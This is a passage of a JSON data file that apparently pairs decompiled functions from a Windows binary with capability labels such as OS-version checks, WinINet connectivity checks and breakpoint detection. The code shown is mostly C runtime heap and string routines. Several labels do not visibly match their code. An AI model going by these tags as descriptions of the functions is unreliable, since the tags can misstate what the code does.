            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.004147e3(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.00412580(0x455f18, 8);\n    iVar2 = fcn.00414501();\n    if (*(iVar2 + 0x6c) != 0) {\n        *(unaff_EBP + -4) = 0;\n        iVar2 = fcn.00414501();\n        (**(iVar2 + 0x6c))();\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.004179c6(10);\n    fcn.0041efc5(0x16);\n    fcn.004123d5(3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 215
    },
    "00410f78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00410f78(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint32_t arg_8h_00;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00412580(0x455d10, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if ((*0x468704 == 3) && (arg_8h_00 <= *0x4686f0)) {\n        fcn.00416625(4);\n        *(unaff_EBP + -4) = 0;\n        uVar1 = fcn.004173c7(arg_8h_00);\n        *(unaff_EBP + -0x1c) = uVar1;\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.00410fea();\n        if (*(unaff_EBP + -0x1c) != 0) goto code_r0x00410fe1;\n    }\n    if (arg_8h_00 == 0) {\n        arg_8h_00 = 1;\n    }\n    if (*0x468704 != 1) {\n        arg_8h_00 = arg_8h_00 + 0xf & 0xfffffff0;\n    }\n    (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x468700, 0, arg_8h_00);\ncode_r0x00410fe1:\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 368
    },
    "00411031": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00411031(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    int32_t arg_ch;\n    uint var_4h;\n    \n    fcn.00412580(0x455d20, 0xc);\n    arg_ch = *(unaff_EBP + 8);\n    if (arg_ch != 0) {\n        if (*0x468704 == 3) {\n            fcn.00416625(4);\n            *(unaff_EBP + -4) = 0;\n            arg_8h_00 = fcn.004167a3(arg_ch);\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 != 0) {\n                fcn.004167ce(arg_8h_00, arg_ch);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00411084();\n            if (*(unaff_EBP + -0x1c) != 0) goto code_r0x0041109c;\n            arg_ch = *(unaff_EBP + 8);\n        }\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x468700, 0, arg_ch);\n    }\ncode_r0x0041109c:\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 337
    },
    "004110a2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004110a2(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_58h;\n    uint lpSystemInfo;\n    int32_t var_48h;\n    uint32_t lpBuffer;\n    int32_t var_24h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint var_13h;\n    uint lpflOldProtect;\n    int32_t dwSize;\n    uint32_t lpAddress;\n    \n    fcn.004112a0();\n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(&var_58h, &lpBuffer, 0x1c);\n    if (iVar1 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)(&lpSystemInfo);\n        uVar4 = (~(var_48h - 1U) & &var_58h) - var_48h;\n        uVar3 = ((-(*0x467088 != 1) & 0xfffffff1) + 0x11) * var_48h + var_24h;\n        dwSize = var_48h;\n        if (uVar3 <= uVar4) {\n            lpAddress = uVar4;\n            if (*0x467088 != 1) {\n                lpAddress = var_24h;\n                do {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(lpAddress, &lpBuffer, 0x1c);\n                    if (iVar1 == 0) {\n                        return 0;\n                    }\n                    lpAddress = lpAddress + var_1ch;\n                } while ((var_18h & 0x1000) == 0);\n                lpAddress = lpBuffer;\n                if ((var_13h & 1) != 0) {\n                    return 1;\n                }\n                if (uVar4 < lpBuffer) {\n                    return 0;\n                }\n                if (lpBuffer < uVar3) {\n                    lpAddress = uVar3;\n                }\n                (*_sym.imp.KERNEL32.dll_VirtualAlloc)(lpAddress, dwSize, 0x1000, 4);\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_VirtualProtect)\n                              (lpAddress, dwSize, (-(*0x467088 != 1) & 0x103) + 1, &lpflOldProtect);\n            return uVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 585
    },
    "00411323": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.00411323(uint8_t *arg_8h, char *arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint8_t *puVar9;\n    uint var_4h;\n    \n    iVar2 = fcn.00414501();\n    iVar2 = *(iVar2 + 0x60);\n    if (iVar2 != *0x46870c) {\n        iVar2 = fcn.00412c04();\n    }\n    if (*(iVar2 + 8) == 0) {\n        puVar3 = fcn.00417940(arg_8h, arg_ch);\n        return puVar3;\n    }\n    if (*arg_ch == '\\0') {\n        return arg_8h;\n    }\n    iVar4 = fcn.00411cb0(arg_ch);\n    iVar5 = fcn.00411cb0(arg_8h);\n    if (*arg_8h != 0) {\n        iVar7 = arg_8h - arg_ch;\n        puVar3 = arg_8h;\n        do {\n            if (arg_8h + (iVar5 - iVar4) < puVar3) {\n                return NULL;\n            }\n            pcVar6 = arg_ch;\n            uVar1 = *puVar3;\n            while (uVar1 != 0) {\n                if (*pcVar6 == '\\0') {\n                    return puVar3;\n                }\n                if (pcVar6[iVar7] != *pcVar6) break;\n                pcVar6 = pcVar6 + 1;\n                uVar1 = pcVar6[iVar7];\n            }\n            if (*pcVar6 == '\\0') {\n                return puVar3;\n            }\n            puVar9 = puVar3 + 1;\n            iVar8 = iVar7 + 1;\n            if ((*(*puVar3 + 0x1d + iVar2) & 4) != 0) {\n                if (*puVar9 == 0) {\n                    return NULL;\n                }\n                puVar9 = puVar3 + 2;\n                iVar8 = iVar7 + 2;\n            }\n            iVar7 = iVar8;\n            puVar3 = puVar9;\n        } while (*puVar9 != 0);\n    }\n    return NULL;\n}\n",
        "token_count": 542
    },
    "004118cf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004118cf(uint *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint8_t uVar4;\n    uint16_t uVar5;\n    int32_t iVar6;\n    uint16_t uVar7;\n    uint8_t *puVar8;\n    bool bVar9;\n    \n    iVar6 = fcn.00414501();\n    iVar6 = *(iVar6 + 0x60);\n    if (iVar6 != *0x46870c) {\n        iVar6 = fcn.00412c04();\n    }\n    if (*(iVar6 + 8) != 0) {\n        while( true ) {\n            uVar4 = *arg_8h;\n            uVar5 = uVar4;\n            puVar3 = arg_8h + 1;\n            if ((*(uVar4 + 0x1d + iVar6) & 4) != 0) {\n                if (*puVar3 == 0) {\n                    uVar5 = 0;\n                }\n                else {\n                    uVar5 = CONCAT11(uVar4, *puVar3);\n                    puVar3 = arg_8h + 2;\n                }\n            }\n            arg_8h = puVar3;\n            uVar4 = *arg_ch;\n            uVar7 = uVar4;\n            puVar8 = arg_ch + 1;\n            if ((*(uVar4 + 0x1d + iVar6) & 4) != 0) {\n                uVar1 = *puVar8;\n                if (uVar1 == 0) {\n                    uVar7 = 0;\n                }\n                else {\n                    puVar8 = arg_ch + 2;\n                    uVar7 = CONCAT11(uVar4, uVar1);\n                }\n            }\n            if (uVar7 != uVar5) break;\n            arg_ch = puVar8;\n            if (uVar5 == 0) {\n                return 0;\n            }\n        }\n        return (-(uVar7 < uVar5) & 2) - 1;\n    }\n    if ((arg_8h & 3) != 0) {\n        if ((arg_8h & 1) != 0) {\n            uVar4 = *arg_8h;\n            arg_8h = arg_8h + 1;\n            bVar9 = uVar4 < *arg_ch;\n            if (uVar4 != *arg_ch) goto code_r0x00418694;\n            arg_ch = arg_ch + 1;\n            if (uVar4 == 0) {\n                return 0;\n            }\n            if ((arg_8h & 2) == 0) goto code_r0x00418660;\n        }\n        uVar5 = *arg_8h;\n        arg_8h = arg_8h + 2;\n        uVar4 = uVar5;\n        bVar9 = uVar4 < *arg_ch;\n        if (uVar4 != *arg_ch) goto code_r0x00418694;\n        if (uVar4 == 0) {\n            return 0;\n        }\n        uVar4 = uVar5 >> 8;\n        bVar9 = uVar4 < arg_ch[1];\n        if (uVar4 != arg_ch[1]) goto code_r0x00418694;\n        if (uVar4 == 0) {\n            return 0;\n        }\n        arg_ch = arg_ch + 2;\n    }\ncode_r0x00418660:\n    while( true ) {\n        uVar2 = *arg_8h;\n        uVar4 = uVar2;\n        bVar9 = uVar4 < *arg_ch;\n        if (uVar4 != *arg_ch) break;\n        if (uVar4 == 0) {\n            return 0;\n        }\n        uVar4 = uVar2 >> 8;\n        bVar9 = uVar4 < arg_ch[1];\n        if (uVar4 != arg_ch[1]) break;\n        if (uVar4 == 0) {\n            return 0;\n        }\n        uVar4 = uVar2 >> 0x10;\n        bVar9 = uVar4 < arg_ch[2];\n        if (uVar4 != arg_ch[2]) break;\n        if (uVar4 == 0) {\n            return 0;\n        }\n        uVar4 = uVar2 >> 0x18;\n        bVar9 = uVar4 < arg_ch[3];\n        if (uVar4 != arg_ch[3]) break;\n        arg_ch = arg_ch + 4;\n        arg_8h = arg_8h + 1;\n        if (uVar4 == 0) {\n            return 0;\n        }\n    }\ncode_r0x00418694:\n    return bVar9 * -2 + 1;\n}\n",
        "token_count": 1084
    },
    "00411e20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t * __cdecl fcn.00411e20(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    \n    iVar3 = fcn.00414501();\n    iVar3 = *(iVar3 + 0x60);\n    if (iVar3 != *0x46870c) {\n        iVar3 = fcn.00412c04();\n    }\n    if (*(iVar3 + 8) == 0) {\n        uVar7 = arg_8h & 3;\n        while (uVar7 != 0) {\n            if (*arg_8h == arg_ch) {\n                return arg_8h;\n            }\n            if (*arg_8h == 0) {\n                return NULL;\n            }\n            uVar7 = arg_8h + 1 & 3;\n            arg_8h = arg_8h + 1;\n        }\n        while( true ) {\n            while( true ) {\n                uVar7 = *arg_8h;\n                uVar6 = uVar7 ^ CONCAT22(CONCAT11(arg_ch, arg_ch), CONCAT11(arg_ch, arg_ch));\n                uVar4 = uVar7 ^ 0xffffffff ^ uVar7 + 0x7efefeff;\n                puVar5 = arg_8h + 1;\n                if (((uVar6 ^ 0xffffffff ^ uVar6 + 0x7efefeff) & 0x81010100) != 0) break;\n                arg_8h = puVar5;\n                if ((uVar4 & 0x81010100) != 0) {\n                    if ((uVar4 & 0x1010100) != 0) {\n                        return NULL;\n                    }\n                    if ((uVar7 + 0x7efefeff & 0x80000000) == 0) {\n                        return NULL;\n                    }\n                }\n            }\n            uVar7 = *arg_8h;\n            if (uVar7 == arg_ch) {\n                return arg_8h;\n            }\n            if (uVar7 == 0) {\n                return NULL;\n            }\n            uVar2 = uVar7 >> 8;\n            if (uVar2 == arg_ch) {\n                return arg_8h + 1;\n            }\n            if (uVar2 == 0) break;\n            uVar2 = uVar7 >> 0x10;\n            if (uVar2 == arg_ch) {\n                return arg_8h + 2;\n            }\n            if (uVar2 == 0) {\n                return NULL;\n            }\n            uVar2 = uVar7 >> 0x18;\n            if (uVar2 == arg_ch) {\n                return arg_8h + 3;\n            }\n            arg_8h = puVar5;\n            if (uVar2 == 0) {\n                return NULL;\n            }\n        }\n        return NULL;\n    }\n    while( true ) {\n        uVar2 = *arg_8h;\n        uVar7 = uVar2;\n        if (uVar2 == 0) break;\n        if ((*(uVar7 + 0x1d + iVar3) & 4) == 0) {\n            puVar5 = arg_8h;\n            if (arg_ch == uVar7) break;\n        }\n        else {\n            uVar1 = *(arg_8h + 1);\n            if (uVar1 == 0) {\n                return NULL;\n            }\n            puVar5 = arg_8h + 1;\n            if (arg_ch == CONCAT11(uVar2, uVar1)) {\n                return arg_8h;\n            }\n        }\n        arg_8h = puVar5 + 1;\n    }\n    return ~-(arg_ch != uVar7) & arg_8h;\n}\n",
        "token_count": 882
    },
    "00411e9b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00411e9b(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint32_t arg_10h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00412580(0x455d98, 0x14);\n    arg_ch_00 = *(unaff_EBP + 8);\n    if (arg_ch_00 == 0) {\n        fcn.0041101f(*(unaff_EBP + 0xc));\n    }\n    else {\n        arg_10h = *(unaff_EBP + 0xc);\n        if (arg_10h == 0) {\n            fcn.00411031(arg_ch_00);\n        }\n        else if (*0x468704 == 3) {\n            do {\n                *(unaff_EBP + -0x1c) = 0;\n                if (arg_10h < 0xffffffe1) {\n                    fcn.00416625(4);\n                    *(unaff_EBP + -4) = 0;\n                    iVar1 = fcn.004167a3(arg_ch_00);\n                    *(unaff_EBP + -0x20) = iVar1;\n                    if (iVar1 != 0) {\n                        if (arg_10h <= *0x4686f0) {\n                            iVar1 = fcn.00416ca3(iVar1, arg_ch_00, arg_10h);\n                            if (iVar1 == 0) {\n                                iVar1 = fcn.004173c7(arg_10h);\n                                *(unaff_EBP + -0x1c) = iVar1;\n                                if (iVar1 != 0) {\n                                    uVar2 = *(arg_ch_00 + -4) - 1;\n                                    *(unaff_EBP + -0x24) = uVar2;\n                                    if (arg_10h <= uVar2) {\n                                        uVar2 = arg_10h;\n                                    }\n                                    fcn.00411970(*(unaff_EBP + -0x1c), arg_ch_00, uVar2);\n                                    uVar3 = fcn.004167a3(arg_ch_00);\n                                    *(unaff_EBP + -0x20) = uVar3;\n                                    fcn.004167ce(uVar3, arg_ch_00);\n                                }\n                            }\n                            else {\n                                *(unaff_EBP + -0x1c) = arg_ch_00;\n                            }\n                        }\n                        if (*(unaff_EBP + -0x1c) == 0) {\n                            if (arg_10h == 0) {\n                                arg_10h = 1;\n                                *(unaff_EBP + 0xc) = 1;\n                            }\n                            arg_10h = arg_10h + 0xf & 0xfffffff0;\n                            *(unaff_EBP + 0xc) = arg_10h;\n                            iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x468700, 0, arg_10h);\n                            *(unaff_EBP + -0x1c) = iVar1;\n                            if (iVar1 != 0) {\n                                uVar2 = *(arg_ch_00 + -4) - 1;\n                                *(unaff_EBP + -0x24) = uVar2;\n                                if (arg_10h <= uVar2) {\n                                    uVar2 = arg_10h;\n                                }\n                                fcn.00411970(*(unaff_EBP + -0x1c), arg_ch_00, uVar2);\n                                fcn.004167ce(*(unaff_EBP + -0x20), arg_ch_00);\n                            }\n                        }\n                    }\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    fcn.00412003();\n                    if (*(unaff_EBP + -0x20) == 0) {\n                        if (arg_10h == 0) {\n                            arg_10h = 1;\n                        }\n                        arg_10h = arg_10h + 0xf & 0xfffffff0;\n                        *(unaff_EBP + 0xc) = arg_10h;\n                        uVar3 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x468700, 0, arg_ch_00, arg_10h);\n                        *(unaff_EBP + -0x1c) = uVar3;\n                    }\n                }\n            } while (((*(unaff_EBP + -0x1c) == 0) && (*0x467234 != 0)) && (iVar1 = fcn.004176ed(arg_10h),  iVar1 != 0));\n        }\n        else {\n            do {\n                iVar1 = 0;\n                if (arg_10h < 0xffffffe1) {\n                    if (arg_10h == 0) {\n                        arg_10h = 1;\n                    }\n                    iVar1 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x468700, 0, arg_ch_00, arg_10h);\n                }\n            } while (((iVar1 == 0) && (*0x467234 != 0)) && (iVar1 = fcn.004176ed(arg_10h),  iVar1 != 0));\n        }\n    }\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 1250
    },
    "00412684": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412684(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == 0) {\n        fcn.004125de(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "0041269c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041269c(uint lpMem, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint32_t arg_10h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00412580(0x455e00, 0x10);\n    arg_10h = *(unaff_EBP + 0xc);\n    if (arg_10h < 0xffffffe1) {\n        if (*0x468704 == 3) {\n            fcn.00416625(4);\n            *(unaff_EBP + -4) = 0;\n            uVar2 = *(unaff_EBP + 8);\n            iVar1 = fcn.004167a3(uVar2);\n            *(unaff_EBP + -0x20) = iVar1;\n            if (((iVar1 != 0) && (*(unaff_EBP + -0x1c) = 0,  arg_10h <= *0x4686f0)) &&\n               (iVar1 = fcn.00416ca3(iVar1, uVar2, arg_10h),  iVar1 != 0)) {\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0041271a();\n            if (*(unaff_EBP + -0x20) != 0) goto code_r0x00412740;\n            if (arg_10h == 0) {\n                arg_10h = 1;\n            }\n            arg_10h = arg_10h + 0xf & 0xfffffff0;\n        }\n        else if (arg_10h == 0) {\n            arg_10h = 1;\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x468700, 0x10, *(unaff_EBP + 8), arg_10h);\n        *(unaff_EBP + -0x1c) = uVar2;\n    }\ncode_r0x00412740:\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 516
    },
    "00412746": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00412746(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00412580(0x455e10, 0x10);\n    if (*0x468704 == 3) {\n        fcn.00416625(4);\n        *(unaff_EBP + -4) = 0;\n        iVar1 = *(unaff_EBP + 8);\n        iVar2 = fcn.004167a3(iVar1);\n        *(unaff_EBP + -0x20) = iVar2;\n        if (iVar2 != 0) {\n            *(unaff_EBP + -0x1c) = *(iVar1 + -4) + -9;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.004127b3();\n        if (*(unaff_EBP + -0x20) != 0) goto code_r0x004127a8;\n    }\n    (*_sym.imp.KERNEL32.dll_HeapSize)(*0x468700, 0, *(unaff_EBP + 8));\ncode_r0x004127a8:\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 318
    },
    "004127bc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.004127bc(uint8_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    \n    iVar1 = fcn.00414501();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x46466c) {\n        iVar1 = fcn.00419574();\n    }\n    while( true ) {\n        if (*(iVar1 + 0x28) < 2) {\n            uVar2 = *(*(iVar1 + 0x48) + *param_1 * 2) & 8;\n        }\n        else {\n            uVar2 = fcn.004191e8(iVar1, *param_1, 8);\n        }\n        if (uVar2 == 0) break;\n        param_1 = param_1 + 1;\n    }\n    uVar2 = *param_1;\n    puVar5 = param_1 + 1;\n    if ((uVar2 == 0x2d) || (uVar3 = uVar2,  uVar2 == 0x2b)) {\n        uVar3 = *puVar5;\n        puVar5 = param_1 + 2;\n    }\n    iVar1 = 0;\n    while( true ) {\n        if ((uVar3 < 0x30) || (0x39 < uVar3)) {\n            iVar4 = -1;\n        }\n        else {\n            iVar4 = uVar3 - 0x30;\n        }\n        if (iVar4 == -1) break;\n        iVar1 = iVar4 + iVar1 * 10;\n        uVar3 = *puVar5;\n        puVar5 = puVar5 + 1;\n    }\n    if (uVar2 == 0x2d) {\n        iVar1 = -iVar1;\n    }\n    return iVar1;\n}\n",
        "token_count": 437
    },
    "00412a78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_518h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00412a78(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar uVar4;\n    char cVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint8_t *puVar8;\n    uint unaff_ESI;\n    uint *puVar9;\n    uint noname_8;\n    uint noname_9;\n    uint *noname_2;\n    uint noname_11;\n    uint *noname_4;\n    uint noname_13;\n    uint noname_14;\n    uint noname_15;\n    uint noname_8_00;\n    uint *noname_1;\n    uint noname_10;\n    uint noname_12;\n    uint noname_13_00;\n    uint noname_14_00;\n    uint noname_7;\n    uint *arg_8h;\n    uint var_518h;\n    uint in_stack_fffffae8;\n    uint in_stack_fffffaec;\n    uint in_stack_fffffaf0;\n    uint in_stack_fffffaf4;\n    uint in_stack_fffffaf8;\n    uint in_stack_fffffafc;\n    uint in_stack_fffffb00;\n    uint in_stack_fffffb04;\n    uint var_318h;\n    uint var_218h;\n    uint var_118h;\n    uint lpCPInfo;\n    uint var_12h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    arg_8h = &lpCPInfo;\n    noname_7 = *0x468824;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n    if (iVar2 == 1) {\n        uVar3 = 0;\n        do {\n            *(&var_118h + uVar3) = uVar3;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n        var_118h._0_1_ = 0x20;\n        if (var_12h != 0) {\n            puVar8 = &var_12h + 1;\n            do {\n                uVar3 = var_12h;\n                if (uVar3 <= *puVar8) {\n                    uVar6 = (*puVar8 - uVar3) + 1;\n                    puVar9 = &var_118h + uVar3;\n                    for (uVar7 = uVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n                        *puVar9 = 0x20202020;\n                        puVar9 = puVar9 + 1;\n                    }\n                    for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n                        *puVar9 = 0x20;\n                        puVar9 = puVar9 + 1;\n                    }\n                }\n                var_12h._0_1_ = puVar8[1];\n                puVar8 = puVar8 + 2;\n            } while (var_12h != 0);\n        }\n        noname_14_00 = 0;\n        puVar9 = &var_518h;\n        noname_10 = 0x100;\n        noname_1 = &var_118h;\n        noname_8_00 = 1;\n        noname_12 = *0x468824;\n        noname_13_00 = *0x468708;\n        fcn.0041a164(1, noname_1, 0x100, puVar9, *0x468824, *0x468708, 0, noname_7, arg_8h, unaff_ESI, var_518h, \n                     in_stack_fffffae8, in_stack_fffffaec, in_stack_fffffaf0, in_stack_fffffaf4);\n        noname_15 = 0;\n        noname_4 = &var_218h;\n        noname_13 = 0x100;\n        noname_11 = 0x100;\n        noname_2 = &var_118h;\n        noname_9 = 0x100;\n        noname_8 = *0x468708;\n        noname_14 = *0x468824;\n        fcn.00419da8(*0x468708, 0x100, noname_2, 0x100, noname_4, 0x100, *0x468824, 0, noname_8_00, noname_1, noname_10\n                     , puVar9, noname_12, noname_13_00, noname_14_00, noname_7, arg_8h, unaff_ESI, var_518h, \n                     in_stack_fffffae8, in_stack_fffffaec, in_stack_fffffaf0, in_stack_fffffaf4, in_stack_fffffaf8, \n                     in_stack_fffffafc, in_stack_fffffb00, in_stack_fffffb04);\n        fcn.00419da8(*0x468708, 0x200, &var_118h, 0x100, &var_318h, 0x100, *0x468824, 0, noname_8, noname_9, noname_2, \n                     noname_11, noname_4, noname_13, noname_14, noname_15, noname_8_00, noname_1, noname_10, puVar9, \n                     noname_12, noname_13_00, noname_14_00, noname_7, arg_8h, unaff_ESI, var_518h);\n        uVar3 = 0;\n        do {\n            uVar1 = *(&var_518h + uVar3 * 2);\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 & 2) != 0) {\n                    *(uVar3 + 0x468721) = *(uVar3 + 0x468721) | 0x20;\n                    uVar4 = *(&var_318h + uVar3);\n                    goto code_r0x00412b8a;\n                }\n                *(uVar3 + 0x468840) = 0;\n            }\n            else {\n                *(uVar3 + 0x468721) = *(uVar3 + 0x468721) | 0x10;\n                uVar4 = *(&var_218h + uVar3);\ncode_r0x00412b8a:\n                *(uVar3 + 0x468840) = uVar4;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n    }\n    else {\n        uVar3 = 0;\n        